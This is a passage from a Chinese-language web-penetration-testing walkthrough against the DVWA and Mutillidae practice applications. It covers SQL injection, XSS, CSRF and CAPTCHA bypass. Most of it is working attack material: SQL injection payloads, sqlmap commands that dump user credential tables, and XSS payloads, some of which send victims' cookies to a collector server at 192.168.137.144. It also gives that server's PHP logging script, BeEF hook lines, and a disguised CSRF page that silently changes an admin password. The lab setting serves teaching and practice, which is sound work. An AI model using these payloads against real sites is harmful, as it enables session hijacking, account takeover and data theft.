union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: last_name\n\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: user\n\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: password\n\nID: ' union select 1,column_name from information_schema.columns where table_name='users' -- dd\nFirst name: 1\nSurname: avatar\n```\n\n知道表中的列名后，可以根据列查询对应列的数据，比如查询账号密码**' union select user,password from users -- dd**：\n\n```\nID: ' union select user,password from users -- dd\nFirst name: admin\nSurname: 21232f297a57a5a743894a0e4a801fc3\n\nID: ' union select user,password from users -- dd\nFirst name: gordonb\nSurname: e99a18c428cb38d5f260853678922e03\n\nID: ' union select user,password from users -- dd\nFirst name: 1337\nSurname: 8d3533d75ae2c3966d7e0d4fcc69216b\n\nID: ' union select user,password from users -- dd\nFirst name: pablo\nSurname: 0d107d09f5bbe40cade3de5c71e9e9b7\n\nID: ' union select user,password from users -- dd\nFirst name: smithy\nSurname: 5f4dcc3b5aa765d61d8327deb882cf99\n\nID: ' union select user,password from users -- dd\nFirst name: user\nSurname: ee11cbb19052e40b07aac0ca060c23ee\n```\n\n密码是MD5加密的，只要找个MD5解密网页就可知道正确密码。\n\n如果我们需要的信息有4列，但系统给的字段只有2列，我们可以用concat()函数实现字符串合并，**' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd**：\n\n```\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: 21232f297a57a5a743894a0e4a801fc3\nSurname: admin admin admin\n\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: e99a18c428cb38d5f260853678922e03\nSurname: Gordon Brown gordonb\n\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: 8d3533d75ae2c3966d7e0d4fcc69216b\nSurname: Hack Me 1337\n\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: 0d107d09f5bbe40cade3de5c71e9e9b7\nSurname: Pablo Picasso pablo\n\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: 5f4dcc3b5aa765d61d8327deb882cf99\nSurname: Bob Smith smithy\n\nID: ' union select password,concat(first_name,' ', last_name,' ', user) from users -- dd\nFirst name: ee11cbb19052e40b07aac0ca060c23ee\nSurname: user user user\n```\n\n在函数被过滤的情况下，可以选择堆叠注入，如：**0';show databases;#**，也可以用contact()连接\n\n```\n1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#\n```\n\n## 3.2 时间盲注\n\n输入单引号没有反应，但不一定它没有注入漏洞。可以试一下**3' and sleep(5)#**，给它一个真条件3，闭合，再停留5秒，发现网页会加载5秒，说明有注入点。\n\n### 3.2.1 SQL盲注[低]\n\n```\nID: 3' union select user,password from users -- dd\nFirst name: Hack\nSurname: Me\n\nID: 3' union select user,password from users -- dd\nFirst name: admin\nSurname: 21232f297a57a5a743894a0e4a801fc3\n\nID: 3' union select user,password from users -- dd\nFirst name: gordonb\nSurname: e99a18c428cb38d5f260853678922e03\n\nID: 3' union select user,password from users -- dd\nFirst name: 1337\nSurname: 8d3533d75ae2c3966d7e0d4fcc69216b\n\nID: 3' union select user,password from users -- dd\nFirst name: pablo\nSurname: 0d107d09f5bbe40cade3de5c71e9e9b7\n\nID: 3' union select user,password from users -- dd\nFirst name: smithy\nSurname: 5f4dcc3b5aa765d61d8327deb882cf99\n\nID: 3' union select user,password from users -- dd\nFirst name: user\nSurname: ee11cbb19052e40b07aac0ca060c23ee\n```\n\n## 3.3 堆叠注入\n\n在函数被过滤的情况下，可以选择堆叠注入，如：**0';show databases;#**。也可以用contact()连接：\n\n```\n1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#\n```\n\n## 3.4 自动化注入\n\nkali中sqlmap一些用法\n\n```\n-u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")\n--batch             Never ask for user input, use the default behavior\n-p TESTPARAMETER    Testable parameter(s)\n--dbms=DBMS         Force back-end DBMS to provided value\n--level=LEVEL       Level of tests to perform (1-5, default 1)\n--risk=RISK         Risk of tests to perform (1-3, default 1)\n--dbs\t\t\t\t获取所有数据库\n--current-db\t\t获取当前数据库\n--users\t\t\t\t获取所有用户\n--current-user\t\t获取当前用户\n-D databese_name --tables\t\t\t\t\t获取database_name的所有表\n-D databese_name -T table_name --columns\t获取database_name的table_name的所有列\n-D databese_name -T table_name -C column_name --dump\t获取database_name的table_name的column_name的数据\n--cookie=COOKIE\t\t添加cookie\n```\n\nGET请求注入：\n\n```sql\nsqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800/?id=1 --batch --tables\n\nsqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800/?id=1 --batch -D sqli -T flag --columns\n\nsqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800/?id=1 --batch -D sqli -T flag -C flag --dump\n```\n\nPOST请求注入：\n\n```sql\nsqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800 --batch --data=\"id=1&pwd=333\"\n```\n\n遇到过滤情况：\n\n```sql\nsqlmap -u http://challenge-b025f09fc3033f00.sandbox.ctfhub.com:10800/?id=1 --batch --tables --tamper \"space2comment.py\"\n```\n\n脚本名：`space2comment.py` \n\n作用：Replaces space character ' ' with comments  /\\**/。\n\n也就是用注释/**/替换空格字符' '。\n\nsqlmap 中的 tamper 脚本有很多，例如：` equaltolike.py `（作用是用like代替等号）、` apostrophemask.py `（作用是用utf8代替引号）、 `greatest.py` （作用是绕过过滤'>' ，用GREATEST替换大于号）等。\n\n### 3.4.1 自动化注入(低)\n\n进入OWASP Mutillidae Ⅱ（不需要登录），选择左侧全部首一一栏，进入登录界面，随便输入错误的名字密码后，复制网页地址，用sqlmap查看网页是否有sql注入漏洞：\n\n```\nsqlmap -u \"http://192.168.137.146/mutillidae/index.php?page=user-info.php&username=91&password=%3Bohk&user-info-php-submit-button=View+Account+Details\" -p username --batch\t\t//只看username有无注入漏洞\n\n[14:30:48] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 10.04 (Lucid Lynx)\nweb application technology: PHP 5.3.2, PHP, Apache 2.2.14\nback-end DBMS: MySQL >= 5.0\t\t//数据库、系统、php等都出来了表示有注入漏洞\n[14:30:52] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.137.146'  \n\n//获得表中的数据\nsqlmap -u \"http://192.168.137.146/mutillidae/index.php?page=user-info.php&username=91&password=%3Bohk&user-info-php-submit-button=View+Account+Details\" --batch -D nowasp -T accounts -C username,password --dump\n\nDatabase: nowasp\nTable: accounts\n[24 entries]\n+----------+--------------+\n| username | password     |\n+----------+--------------+\n| admin    | admin        |\n| adrian   | somepassword |\n| john     | monkey       |\n| jeremy   | password     |\n| bryce    | password     |\n| samurai  | samurai      |\n| jim      | password     |\n| bobby    | password     |\n| simba    | password     |\n| dreveil  | password     |\n| scotty   | password     |\n| cal      | password     |\n| john     | password     |\n| kevin    | 42           |\n| dave     | set          |\n| patches  | tortoise     |\n| rocky    | stripes      |\n| tim      | lanmaster53  |\n| ABaker   | SoSecret     |\n| PPan     | NotTelling   |\n| CHook    | JollyRoger   |\n| james    | i<3devs      |\n| user     | user         |\n| ed       | pentest      |\n+----------+--------------+\n```\n\n如果SQL注入点没有经过登录就可找到，可以直接按照上述方法注入；如果需要登录，肯定不能通过提交方式去登录，因为你也不知道账号密码，所以要通过找cookie（cookie是前端，session是后端）去登录。这也是**SQL注入[中、高]，SQL盲注[中、高]**的解决办法。\n\n回到DVWA（需要登录）的SQL注入，随便输入一个错误数字，用火狐插件cookie监视器将这个网址的所有cookie复制下来（复制下来的是冒号，要改成等号），或者可以通过burpsuite抓包拿到cookie，再跑，结果成功渗透。\n\n```mysql\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" -p id\n\n[16:25:54] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 10.04 (Lucid Lynx)\nweb application technology: PHP 5.3.2, Apache 2.2.14\nback-end DBMS: MySQL >= 5.0\n[16:25:54] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.137.146'   \n\n//先找数据库\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" --dbs\n\navailable databases [2]:\n[*] dvwa\n[*] information_schema\n\n//再找表\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" -D dvwa --tables\n\nDatabase: dvwa\n[2 tables]\n+-----------+\n| guestbook |\n| users     |\n+-----------+\n\n//再找列\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" -D dvwa -T users --columns\n\nDatabase: dvwa\nTable: users\n[6 columns]\n+------------+-------------+\n| Column     | Type        |\n+------------+-------------+\n| user       | varchar(15) |\n| avatar     | varchar(70) |\n| first_name | varchar(15) |\n| last_name  | varchar(15) |\n| password   | varchar(32) |\n| user_id    | int(6)      |\n+------------+-------------+\n\n//再找表中数据\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" -D dvwa -T users -C user,password --dump\n\nDatabase: dvwa                                                    \nTable: users\n[6 entries]\n+---------+---------------------------------------------+\n| user    | password                                    |\n+---------+---------------------------------------------+\n| admin   | 21232f297a57a5a743894a0e4a801fc3 (admin)    |\n| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |\n| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |\n| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |\n| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |\n| user    | ee11cbb19052e40b07aac0ca060c23ee (user)     |\n+---------+---------------------------------------------+\n```\n\n提权操作，与数据库交互：\n\n```mysql\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" --sql-shell\n\nsql-shell> select user,password from users;\n[16:44:30] [INFO] fetching SQL SELECT statement query output: 'select user,password from users'                                       \n[16:44:30] [CRITICAL] connection dropped or unknown HTTP status code received. Try to force the HTTP User-Agent header with option '--user-agent' or switch '--random-agent'. sqlmap is going to retry the request(s)\nselect user,password from users [6]:\n[*] admin, 21232f297a57a5a743894a0e4a801fc3\n[*] gordonb, e99a18c428cb38d5f260853678922e03\n[*] 1337, 8d3533d75ae2c3966d7e0d4fcc69216b\n[*] pablo, 0d107d09f5bbe40cade3de5c71e9e9b7\n[*] smithy, 5f4dcc3b5aa765d61d8327deb882cf99\n[*] user, ee11cbb19052e40b07aac0ca060c23ee\n```\n\n# 4. XSS\n\nCross Site Scripting\n\n经常遭受跨站脚本攻击的典型应用有：邮件、论坛、即时通信、留言板、社交平台等。\n\n## 4.1 XSS跨站脚本攻击\n\nXSS是对客户端进行攻击。\n\n**常用的HTML标签**\n\n```html\n<iframe>\tiframe元素会创建包含另外一个文档的内联框架\n<textarea>\t<textarea>标签定义多行的文本输入控件\n<image>\t\timg元素向网页中嵌入一张图片\n<script>\t<script>标签用于定义客户端脚本，如JavaScript\n    \t\tscript元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件\n            必需的type属性规定脚本的MIME类型\n            JavaScript的常见应用是图像操作，表单验证以及动态内容更新\n```\n\n**常用JavaScript方法**\n\n```html\nalert\t\t\talert()方法用于显示带有一条指定信息和一个确认按钮的警告框\nwindow.location\twindow.location对象用于获得当前页面的地址，并把浏览器重定向到新的页面\nlocation.href\t返回当前显示的文档的完整URL\nonload \t\t\t一张页面或一张图片完成加载\nonsubmit\t\t确认按钮被点击\nonerror\t\t\t在加载文档或图片时发生错误\n```\n\n**构造XSS脚本**\n\n```html\n弹框警告\n此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号'，一旦此脚本能执行，也就意味着后端服务器没有对特殊字符(<>/')做过滤，这样就可以证明这个页面位置存在XSS漏洞。\n<script>alert(\"XSS\")</script>\n<script>alert(document.cookie)</script>\t\t<!-弹出cookie->\n\n页面嵌套\n<iframe src=\"http://www.baidu.com\" width=300 height=300></iframe>\n<iframe src=\"http://www.baidu.com\" width=0 height=0 border=0></iframe> <!-看不见的页面嵌套->\n\n页面重定向\n<script>window.location=\"http://www.baidu.com\"</script>\n<script>location.href=\"http://www.baidu.com\"</script>\n\n弹框警告并重定向\n<script>alert(\"请移步到我们的新站\");location.href=\"http://www.baidu.com\"</script>\n<script>alert('XSS');location.href=\"http://192.168.137.146/dvwa/robots.txt\"</script>\n这里结合了一些社工的思路，例如通过网站内部私信的方式将其发给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户(克隆网站收集账户)\n\n恶意访问代码\n<script src=\"http://www.baidu.com/xss.js\"></script>\n<script src=\"http://BeEF_IP:3000/hook.js\"></script>\t<!-结合BeEF收集用户的cookie->\n\n巧用图片标签\n<img src=\"#\" onerror=alert('xss')>\n<img src=\"javascript:alert('xss');\">\n<img src=\"http://BeEF_IP:3000/hook.js\">\n\n绕开过滤脚本\n大小写<ScrIpt>alert('XSS')</SCRipt>\n字符编码 采用URL，Base64等编码\n<a href=\"&#74;&#97;&#118;&#97;&#83;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#59;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">hacker</a>\t<!-unicode编码->\n\n收集用户cookie\n打开新窗口并且采用本地cookie访问目标网页\n<script>window.open(\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie)</script>\t//弹窗\n<script>document.location=\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie</script>\t//跳转空白页面不弹窗\n<script>new Image().src=\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie;</script>\t//不会发觉\n<img src=\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie>\t//不能用\n<iframe src=\"'http://192.168.137.144/cookie_rec.php?cookie='+document.cookie\"></iframe>\t//不能用\n<script>new Image().src=\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie;img.width=0;img.height=0;</script>\t//不会发觉\n```\n\n**输出在HTML属性中**\n\n```html\n原型:\n<input type=\"text\" name=\"user\" value=\"\">\n构造payload:\n\" onlick=alert(/xss/)\n\"><script>alert(/xss/)</script>\n```\n\n**输出在CSS代码中**\n\n```html\n原型:\n<style type=\"text/css\">body{color:{\"\"};}</style>\n构造payload:\nblack; background-image:url('javascript:alert(/xss/)')\n```\n\n**输出在JavaScript代码中**\n\n```html\n原型:\n<script> var name = '';</script>\n构造payload:\n'+alert(/xss/)+'\n```\n\n**XSS反射型**\n\n执行弹框：\n\n```html\n<script>alert(\"xss\")</script>\n```\n\n```http\n//原链接\nhttp://192.168.137.146/dvwa/vulnerabilities/xss_r/\n//新链接\nhttp://192.168.137.146/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E#\n```\n\n如果别人登进dvwa后，点进新链接，也会执行弹框。可以执行弹框，那也可以让别人点进链接后将他的cookie发到另一台服务器上。\n\n**XSS存储型(危害较大)**\n\n```\nkali-BeEF\n```\n\n这是一个留言板，留言板的内容会停留在网页上，如果将恶意代码放在网页上，每个人一访问这个留言板就会中招。\n\n执行弹框：\n\n```html\nname:hello\nmessage:<script>alert(\"xss\")</script>\n```\n\n```http\n//原链接：\nhttp://192.168.137.146/dvwa/vulnerabilities/xss_s/\n//新链接\nhttp://192.168.137.146/dvwa/vulnerabilities/xss_s/\n```\n\n在链接上不会显示什么，但只要一点XSS stored，就会执行弹框。这样称为挂马，把木马挂在了网页上。\n\n访问另一台机器的文件：\n\n```html\n<script src=\"192.168.137.144:3000/hook.js\"></script>\n```\n\n## 4.2 XSS反射型[低]\n\n查看源码：\n\n```php\n<?php\n\nif(!array_key_exists (\"name\", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){\n\n $isempty = true;\n\n} else {\n        \n echo '<pre>';\n echo 'Hello ' . $_GET['name'];\n echo '</pre>';\n    \n}\n\n?>\n```\n\n没有做任何过滤。可以利用以上的xss脚本进行操作。\n\n## 4.3 XSS反射型[中]\n\n查看源码：\n\n```php\n<?php\n\nif(!array_key_exists (\"name\", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){\n\n $isempty = true;\n\n} else {\n\n echo '<pre>';\n echo 'Hello ' . str_replace('<script>', '', $_GET['name']);\n echo '</pre>'; \n\n}\n\n?> \n```\n\nstr.replace()会做一个字符串替换，将\\<script\\>替换成空。所以可以对\\<script\\>进行重写，或者大小写混合。\n\n```html\n<scr<script>ipt>alert(\"xss\")</script>\n<ScrIpt>alert('XSS')</SCRipt>\n```\n\n## 4.4 XSS反射型[高]\n\n查看源码：\n\n```php\n<?php\n    \nif(!array_key_exists (\"name\", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){\n    \n $isempty = true;\n        \n} else {\n    \n echo '<pre>';\n echo 'Hello ' . htmlspecialchars($_GET['name']);\n echo '</pre>';\n        \n}\n\n?> \n```\n\n htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 \n\n## 4.5 XSS存储型[低]\n\n```\n获取cookie，kali作为服务器与攻击机:\n构建收集cookie服务器\n构造XSS代码植入到web服务器\n等待肉鸡触发XSS代码并将cookie发送到服务器\ncookie的利用\n```\n\n构建收集cookie服务器：\n\n```php\nvim /var/www/html/cookie_rec.php\n<?php\n\t$cookie = $_GET['cookie'];\n\t$log = fopen(\"cookie.txt\",\"a\");\n\tfwrite($log, $cookie.\"\\n\\n\");\n\tfclose($log);\n?>\n```\n\n给以下目录权限，等下生成的文本文件存进去：\n\n```\nchown -R www-data.www-data /var/www/\n```\n\n通过渗透机植入XSS代码：\n\n```html\n<script>window.open('http://192.168.137.144/cookie_rec.php?cookie='+document.cookie)</script>\n\n注：要先清除之前植入的XSS代码\n```\n\n在XSS存储型网页中，发现前端限制留言长度，直接在前端修改最大长度即可。当用户点进XSS存储型时，会显示弹窗，用户的cookie信息就会收集在服务器上。但现在很多浏览器都会拦截弹窗，所以弄一个不会弹窗的：\n\n```html\n<script>new Image().src=\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie;</script>\n\n用户几乎不会发觉cookie被盗\n```\n\n## 4.6 XSS存储型[中]\n\n查看源码：\n\n```php\n<?php\n\nif(isset($_POST['btnSign']))\n{\n\n   $message = trim($_POST['mtxMessage']);\n   $name    = trim($_POST['txtName']);\n   \n   // Sanitize message input\n   $message = trim(strip_tags(addslashes($message)));\n   $message = mysql_real_escape_string($message);\n   $message = htmlspecialchars($message);\n    \n   // Sanitize name input\n   $name = str_replace('<script>', '', $name);\n   $name = mysql_real_escape_string($name);\n  \n   $query = \"INSERT INTO guestbook (comment,name) VALUES ('$message','$name');\";\n   \n   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );\n   \n}\n\n?> \n```\n\n可知message用了 htmlspecialchars() 函数，暂时不知道怎么利用，但name没有用，所以可以将恶意代码写进name里面。\n\n## 4.7 XSS存储型[高]\n\n查看源码：\n\n```php\n<?php\n\nif(isset($_POST['btnSign']))\n{\n\n   $message = trim($_POST['mtxMessage']);\n   $name    = trim($_POST['txtName']);\n   \n   // Sanitize message input\n   $message = stripslashes($message);\n   $message = mysql_real_escape_string($message);\n   $message = htmlspecialchars($message);\n   \n   // Sanitize name input\n   $name = stripslashes($name);\n   $name = mysql_real_escape_string($name); \n   $name = htmlspecialchars($name);\n  \n   $query = \"INSERT INTO guestbook (comment,name) VALUES ('$message','$name');\";\n   \n   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );\n   \n}\n\n?> \n```\n\nname和message都用htmlspecialchars()规定了，所以不能在这攻击了。\n\n## 4.8 自动化XSS\n\n**BeEF**\n\n启动Apache和BeEF：\n\n```\nservice apache2 start\ncd /usr/share/beef-xss\n./beef\n```\n\n启动BeEF会自动生成代码和服务器。账号密码保存在/etc/beef-xss/config.yaml\n\n```html\nservice apache2 start\ncd /usr/share/beef-xss\n./beef\n//脚本利用\n<script src=\"http://192.168.193.128:3000/hook.js\"></script>\n//BeEF网站\nhttp://192.168.193.128:3000/ui/panel\n//监听端口\nss -tnlp\n```\n\n用户点进XSS存储型后几乎不会发觉木马，BeEF除了能拿到用户的cookie还能实行很多功能。\n\n```\n命令颜色\n绿色 对目标主机生效并且不可见(不会被发现)\n灰色 对目标主机未必生效(可验证一下)\n橙色 对目标主机生效但可能可见(可能被发现)\n红色 对目标主机不生效\n```\n\n# 5. CSRF(跨站请求伪造)\n\nCSRF是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。\n\nCSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。 \n\n## 5.1 CSRF[低]\n\n 查看源码：\n\n```php\n <?php\n                \n    if (isset($_GET['Change'])) {\n    \n        // Turn requests into variables\n        $pass_new = $_GET['password_new'];\n        $pass_conf = $_GET['password_conf'];\n\n\n        if (($pass_new == $pass_conf)){\n            $pass_new = mysql_real_escape_string($pass_new);\n            $pass_new = md5($pass_new);\n\n            $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';\";\n            $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n                        \n            echo \"<pre> Password Changed </pre>\";        \n            mysql_close();\n        }\n    \n        else{        \n            echo \"<pre> Passwords did not match. </pre>\";            \n        }\n\n    }\n?> \n```\n\n这个修改密码竟然是$_GET请求，说明密码会在url上显示。如果用户点击以下链接，他的密码就会改成123。\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/csrf/?password_new=abc&password_conf=abc&Change=Change#\n```\n\n可以用短链接的方法隐藏真实的URL，这样就不容易从链接上看出来修改了密码。\n\n也可以制造一个攻击页面。在本机做一个页面getf.html处理\n\nGetf.html页面代码：\n\n```html\n<img src=\"http://192.168.137.146/dvwa/vulnerabilities/csrf/?password_new=abc&password_conf=abc&Change=Change#\" border=0 style=\"display:none;\">\n<h1>404</h1>\n<h2>not found</h2>\n```\n\n把上面链接放在公网某个地址，当用户点击这个链接后，客户可能以为访问了一个失效页面，这样就神不知鬼不觉地修改了用户密码。\n\n## 5.2 CSRF[中]\n\n```php\n <?php\n            \n    if (isset($_GET['Change'])) {\n    \n        // Checks the http referer header\n        if ( eregi ( \"127.0.0.1\", $_SERVER['HTTP_REFERER'] ) ){\n    \n            // Turn requests into variables\n            $pass_new = $_GET['password_new'];\n            $pass_conf = $_GET['password_conf'];\n\n            if ($pass_new == $pass_conf){\n                $pass_new = mysql_real_escape_string($pass_new);\n                $pass_new = md5($pass_new);\n\n                $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';\";\n                $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n                        \n                echo \"<pre> Password Changed </pre>\";        \n                mysql_close();\n            }\n    \n            else{        \n                echo \"<pre> Passwords did not match. </pre>\";            \n            }    \n\n        }\n        \n    }\n?> \n```\n\neregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。源码意思是验证HTTP_REFERER是否是127.0.0.1，判断请求的来源是否是本机，可以通过Burp Suite抓包，然后修改Reffer的值，只要包含127.0.0.1就可以实现修改，甚至可以只是127.0.0.1这个值。\n\n## 5.3 CSRF[高]\n\n```php\n <?php\n            \n    if (isset($_GET['Change'])) {\n    \n        // Turn requests into variables\n        $pass_curr = $_GET['password_current'];\n        $pass_new = $_GET['password_new'];\n        $pass_conf = $_GET['password_conf'];\n\n        // Sanitise current password input\n        $pass_curr = stripslashes( $pass_curr );\n        $pass_curr = mysql_real_escape_string( $pass_curr );\n        $pass_curr = md5( $pass_curr );\n        \n        // Check that the current password is correct\n        $qry = \"SELECT password FROM `users` WHERE user='admin' AND password='$pass_curr';\";\n        $result = mysql_query($qry) or die('<pre>' . mysql_error() . '</pre>' );\n\n        if (($pass_new == $pass_conf) && ( $result && mysql_num_rows( $result ) == 1 )){\n            $pass_new = mysql_real_escape_string($pass_new);\n            $pass_new = md5($pass_new);\n\n            $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';\";\n            $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n                        \n            echo \"<pre> Password Changed </pre>\";        \n            mysql_close();\n        }\n    \n        else{        \n            echo \"<pre> Passwords did not match or current password incorrect. </pre>\";            \n        }\n\n    }\n?> \n```\n\n这个在修改密码前要输入原密码，如果不知道原密码，就不能搞了。\n\n# 6. CAPTCHA\n\n## 6.1 不安全验证码[低]\n\nCAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。 简单来说是验证码的意思。\n\n```\nreCAPTCHA API key NULL in config file.\n\nPlease register for a key from reCAPTCHA at [https://www.google.com/recaptcha/admin/create](http://hiderefer.com/?https://www.google.com/recaptcha/admin/create) and set the key in the file /owaspbwa/dvwa-svn/config/config.inc.php    \n```\n\n进入这个页面要很长时间，我猜是因为它去访问谷歌拿验证码了。它说要去 [https://www.google.com/recaptcha/admin/create](http://hiderefer.com/?https://www.google.com/recaptcha/admin/create) 注册密钥再把它放进服务器目录 /owaspbwa/dvwa-svn/config/config.inc.php 里。由于没有科学上网，我就不弄了。\n\n先来看下源码：\n\n```php\n<?php\n\nif( isset( $_POST['Change'] ) && ( $_POST['step'] == '1' ) ) {\n    \n    $hide_form = true;\n    $user = $_POST['username'];\n    $pass_new = $_POST['password_new'];\n    $pass_conf = $_POST['password_conf'];\n    $resp = recaptcha_check_answer ($_DVWA['recaptcha_private_key'],\n        $_SERVER[\"REMOTE_ADDR\"],\n        $_POST[\"recaptcha_challenge_field\"],\n        $_POST[\"recaptcha_response_field\"]);\n\n    if (!$resp->is_valid) {\n        // What happens when the CAPTCHA was entered incorrectly\n        echo \"<pre><br />The CAPTCHA was incorrect. Please try again.</pre>\";\n        $hide_form = false;\n        return;    \n    } else {\n            if (($pass_new == $pass_conf)){\n            echo \"<pre><br />You passed the CAPTCHA! Click the button to confirm your changes. <br /></pre>\";\n            echo \"\n            <form action=\\\"#\\\" method=\\\"POST\\\">\n                <input type=\\\"hidden\\\" name=\\\"step\\\" value=\\\"2\\\" />\n                <input type=\\\"hidden\\\" name=\\\"password_new\\\" value=\\\"\" . $pass_new . \"\\\" />\n                <input type=\\\"hidden\\\" name=\\\"password_conf\\\" value=\\\"\" . $pass_conf . \"\\\" />\n                <input type=\\\"submit\\\" name=\\\"Change\\\" value=\\\"Change\\\" />\n            </form>\";\n            }    \n\n            else{\n                    echo \"<pre> Both passwords must match </pre>\";\n            $hide_form = false;\n            }\n    }\n}\n\nif( isset( $_POST['Change'] ) && ( $_POST['step'] == '2' ) ) \n{\n    $hide_form = true;\n        if ($pass_new != $pass_conf)\n        {\n                echo \"<pre><br />Both passwords must match</pre>\";\n        $hide_form = false;\n                return;\n        }\n        $pass = md5($pass_new);\n        if (($pass_new == $pass_conf)){\n               $pass_new = mysql_real_escape_string($pass_new);\n               $pass_new = md5($pass_new);\n\n               $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n               $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n\n               echo \"<pre> Password Changed </pre>\";\n               mysql_close();\n        }\n\n        else{\n               echo \"<pre> Passwords did not match. </pre>\";\n        }\n}\n\n?> \n```\n\n很清楚看到，整个修改密码过程分为两步，第一步是验证验证码是否正确，第二步是修改密码。我们可以通过抓包直接将step修改为2跳过验证。\n\n## 6.2 不安全验证码[中]\n\n```php\n<?php\nif( isset( $_POST['Change'] ) && ( $_POST['step'] == '1' ) ) {\n    \n    $hide_form = true;\n    $user = $_POST['username'];\n    $pass_new = $_POST['password_new'];\n    $pass_conf = $_POST['password_conf'];\n    $resp = recaptcha_check_answer($_DVWA['recaptcha_private_key'],\n        $_SERVER[\"REMOTE_ADDR\"],\n        $_POST[\"recaptcha_challenge_field\"],\n        $_POST[\"recaptcha_response_field\"]);\n\n    if (!$resp->is_valid) {\n        // What happens when the CAPTCHA was entered incorrectly\n        echo \"<pre><br />The CAPTCHA was incorrect. Please try again.</pre>\";\n        $hide_form = false;\n        return;    \n    } else {\n            if (($pass_new == $pass_conf)){\n            echo \"<pre><br />You passed the CAPTCHA! Click the button to confirm your changes. <br /></pre>\";\n            echo \"\n            <form action=\\\"#\\\" 